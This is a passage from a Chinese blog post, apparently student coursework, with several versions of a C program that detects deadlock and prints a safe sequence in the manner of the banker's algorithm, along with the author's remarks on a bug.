class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">end</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">to1:</span><br><span class="line">start();</span><br><span class="line"><span class="keyword">if</span>(end())<span class="keyword">goto</span> to1;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//基本数据输入： </span></span><br><span class="line"><span class="keyword">int</span> b,i,j,k,m,n,f;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入进程个数n：&quot;</span>); </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入资源维数m：&quot;</span>); </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;m);</span><br><span class="line"><span class="keyword">int</span> A[n][m],C[n][m],B[n][m],a[m],flag[n]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//**-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入需求矩阵C：\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;n;i++)</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;m;j++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;C[i][j]);</span><br><span class="line"><span class="comment">//**-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入分配矩阵A：\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;n;i++)&#123; </span><br><span class="line">    f = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;A[i][j]);</span><br><span class="line"><span class="keyword">if</span>(A[i][j]==<span class="number">0</span>)f++;<span class="comment">//记录分配矩阵中一个进程中各维元素为0的个数 </span></span><br><span class="line">B[i][j] = C[i][j]-A[i][j];<span class="comment">// B 为 C-A 伴随矩阵 </span></span><br><span class="line"><span class="keyword">if</span>(f==m)flag[i]=<span class="number">1</span>;<span class="comment">//若全为0，则做标记 </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//**------------------------------------------------------------------------------- </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入可用资源量a：&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;m;i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line"><span class="comment">//**-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">//矩阵计算：</span></span><br><span class="line">b = n+<span class="number">1</span>;</span><br><span class="line">to2:</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"> f = <span class="number">0</span>; </span><br><span class="line"> <span class="keyword">if</span>(flag[i]==<span class="number">1</span>)<span class="keyword">continue</span>;<span class="comment">//若该程序有标记则跳过该程序 </span></span><br><span class="line"> <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line"> <span class="keyword">if</span>(a[j]&gt;=B[i][j])f++;</span><br><span class="line"> <span class="keyword">if</span>(f==m)&#123;</span><br><span class="line"> flag[i]=<span class="number">1</span>;</span><br><span class="line"> <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;m;k++)&#123;</span><br><span class="line"> a[k] += A[i][k];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(b--)<span class="keyword">goto</span> to2;<span class="comment">//最坏情况一次只为一个程序标记flag，那么循环n次也能够标记所有能够标记的程序 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//判定标记：</span></span><br><span class="line">f = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(flag[i]==<span class="number">1</span>)f++;</span><br><span class="line"><span class="keyword">if</span>(f==n)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;无死锁&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;存在死锁&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">end</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n是否继续进行下一组测试？[Y/N]:&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;ch);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*--------------------------------------------------------------------------------*\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(ch == <span class="string">&#x27;Y&#x27;</span> || ch == <span class="string">&#x27;y&#x27;</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="测试条件未删减版："><a href="#测试条件未删减版：" class="headerlink" title="测试条件未删减版："></a>测试条件未删减版：</h4><p>运行情况如下：</p><p><img src="image-20211107154126239.png" alt="image-20211107154126239"></p><p>源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">end</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">to1:</span><br><span class="line">start();</span><br><span class="line"><span class="keyword">if</span>(end())<span class="keyword">goto</span> to1;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//基本数据输入： </span></span><br><span class="line"><span class="keyword">int</span> b,i,j,k,m,n,f;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入进程个数n：&quot;</span>); </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入资源维数m：&quot;</span>); </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;m);</span><br><span class="line"><span class="keyword">int</span> A[n][m],C[n][m],B[n][m],a[m],flag[n]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//**-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入需求矩阵C：\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;n;i++)</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;m;j++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;C[i][j]);</span><br><span class="line"><span class="comment">//**-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">/*    printf(&quot;\n矩阵C存储情况：\n&quot;);</span></span><br><span class="line"><span class="comment">for(i = 0;i&lt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">for(j = 0;j&lt;m;j++)&#123;</span></span><br><span class="line"><span class="comment">printf(&quot;%d &quot;,C[i][j]);</span></span><br><span class="line"><span class="comment">&#125; </span></span><br><span class="line"><span class="comment">printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入分配矩阵A：\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;n;i++)&#123; </span><br><span class="line">    f = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;A[i][j]);</span><br><span class="line"><span class="keyword">if</span>(A[i][j]==<span class="number">0</span>)f++;<span class="comment">//记录分配矩阵中一个进程中各维元素为0的个数 </span></span><br><span class="line">B[i][j] = C[i][j]-A[i][j];<span class="comment">// B 为 C-A 伴随矩阵 </span></span><br><span class="line"><span class="keyword">if</span>(f==m)flag[i]=<span class="number">1</span>;<span class="comment">//若全为0，则做标记 </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*printf(&quot;\n矩阵A存储情况：\n&quot;);</span></span><br><span class="line"><span class="comment">for(i = 0;i&lt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">    for(j = 0;j&lt;m;j++)&#123;</span></span><br><span class="line"><span class="comment">printf(&quot;%d &quot;,A[i][j]);</span></span><br><span class="line"><span class="comment">&#125; </span></span><br><span class="line"><span class="comment">printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*printf(&quot;\n矩阵B存储情况：\n&quot;);</span></span><br><span class="line"><span class="comment">for(i = 0;i&lt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">    for(j = 0;j&lt;m;j++)&#123;</span></span><br><span class="line"><span class="comment">printf(&quot;%d &quot;,B[i][j]);</span></span><br><span class="line"><span class="comment">&#125; </span></span><br><span class="line"><span class="comment">printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="comment">//**------------------------------------------------------------------------------- </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入可用资源量a：&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;m;i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*printf(&quot;\n可用资源量a存储情况：&quot;);</span></span><br><span class="line"><span class="comment">for(i = 0;i&lt;m;i++) printf(&quot;%d&quot;,a[i]);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">printf(&quot;flag存储情况：&quot;);</span></span><br><span class="line"><span class="comment">for(i = 0;i&lt;n;i++) printf(&quot;%d&quot;,flag[i]);*/</span></span><br><span class="line"><span class="comment">//**-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">//矩阵计算：</span></span><br><span class="line">b = n+<span class="number">1</span>;</span><br><span class="line">to2:</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"> f = <span class="number">0</span>; </span><br><span class="line"> <span class="keyword">if</span>(flag[i]==<span class="number">1</span>)<span class="keyword">continue</span>;<span class="comment">//若该程序有标记则跳过该程序 </span></span><br><span class="line"> <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line"> <span class="keyword">if</span>(a[j]&gt;=B[i][j])f++;</span><br><span class="line"> <span class="keyword">if</span>(f==m)&#123;</span><br><span class="line"> flag[i]=<span class="number">1</span>;</span><br><span class="line"> <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;m;k++)&#123;</span><br><span class="line"> a[k] += A[i][k];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//printf(&quot;$ &quot;);</span></span><br><span class="line"><span class="keyword">while</span>(b--)<span class="keyword">goto</span> to2;<span class="comment">//最坏情况一次只为一个程序标记flag，那么循环n次也能够标记所有能够标记的程序 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//判定标记：</span></span><br><span class="line">f = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(flag[i]==<span class="number">1</span>)f++;</span><br><span class="line"><span class="keyword">if</span>(f==n)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;无死锁&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;存在死锁&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">end</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n是否继续进行下一组测试？[Y/N]:&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;ch);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*--------------------------------------------------------------------------------*\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(ch == <span class="string">&#x27;Y&#x27;</span> || ch == <span class="string">&#x27;y&#x27;</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>de出一个小bug：</p><p><img src="image-20211107162936095.png" alt="image-20211107162936095"></p><p>思考了一下，总结了一下原因：第1个条件中占据资源全为0的进程不会造成死锁，这是默认了单个进程的所需资源数小于系统总的所拥有的资源数这一条件，倘若这一条件不成立则会出现以上情况。</p><p>所以要改的话，只需要加一个记录系统总资源数的数组，然后跟需求矩阵的各进程所需资源作比较，若出现所需大于所拥有的情况，弹出错误提示，退出程序即可。说完了，还不懂的话来问我就行</p><p>我挺喜欢跟别人讨论问题的，所以有问题尽管找我^_^</p><p>wx : xy1724252720</p><p>看到别人都弄了安全序列，我也弄一个吧，同时把goto都改成while吧：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">end</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> x,y,c[<span class="number">1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">do</span>&#123;start();&#125;<span class="keyword">while</span>(end());</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//基本数据输入： </span></span><br><span class="line"><span class="keyword">int</span> b,i,j,k,m,n,f;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入进程个数n：&quot;</span>); </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入资源维数m：&quot;</span>); </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;m);</span><br><span class="line">x = <span class="number">0</span>;y = n<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> A[n][m],C[n][m],B[n][m],a[m],flag[n]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//**-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入需求矩阵C：\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;n;i++)</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;m;j++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;C[i][j]);</span><br><span class="line"><span class="comment">//**-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入分配矩阵A：\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;n;i++)&#123; </span><br><span class="line">    f = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;A[i][j]);</span><br><span class="line"><span class="keyword">if</span>(A[i][j]==<span class="number">0</span>)f++;<span class="comment">//记录分配矩阵中一个进程中各维元素为0的个数 </span></span><br><span class="line">B[i][j] = C[i][j]-A[i][j];<span class="comment">// B 为 C-A 伴随矩阵 </span></span><br><span class="line"><span class="keyword">if</span>(f==m)&#123;</span><br><span class="line">flag[i]=<span class="number">1</span>;<span class="comment">//若全为0，则做标记 </span></span><br><span class="line">c[y] = i;y--;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//**------------------------------------------------------------------------------- </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入可用资源量a：&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;m;i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line"><span class="comment">//**-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">//矩阵计算：</span></span><br><span class="line">b = n+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(b--)&#123;<span class="comment">//最坏情况一次只为一个程序标记flag，那么循环n次也能够标记所有能够标记的程序 </span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"> f = <span class="number">0</span>; </span><br><span class="line"> <span class="keyword">if</span>(flag[i]==<span class="number">1</span>)<span class="keyword">continue</span>;<span class="comment">//若该程序有标记则跳过该程序 </span></span><br><span class="line"> <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line"> <span class="keyword">if</span>(a[j]&gt;=B[i][j])f++;</span><br><span class="line"> <span class="keyword">if</span>(f==m)&#123;</span><br><span class="line"> flag[i]=<span class="number">1</span>;</span><br><span class="line"> <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;m;k++)&#123;</span><br><span class="line"> a[k] += A[i][k];</span><br><span class="line">&#125;</span><br><span class="line">c[x] = i;x++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判定标记：</span></span><br><span class="line">f = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(flag[i]==<span class="number">1</span>)f++;</span><br><span class="line"><span class="keyword">if</span>(f==n)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;无死锁\n安全序列：&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;n;j++)<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,c[j]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n安全序列+1：&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;n;j++)<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,c[j]+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;存在死锁&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">end</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n是否继续进行下一组测试？[Y/N]:&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;ch);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*--------------------------------------------------------------------------------*\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(ch == <span class="string">&#x27;Y&#x27;</span> || ch == <span class="string">&#x27;y&#x27;</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="银行家算法plus"><a href="#银行家算法plus" class="headerlink" title="银行家算法plus"></a>银行家算法plus</h3><p>之前老师的要求没给全，导致我写的银行家算法功能不太全，现在课设要求更高了，写一个更加完善一点的银行家算法做记录，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 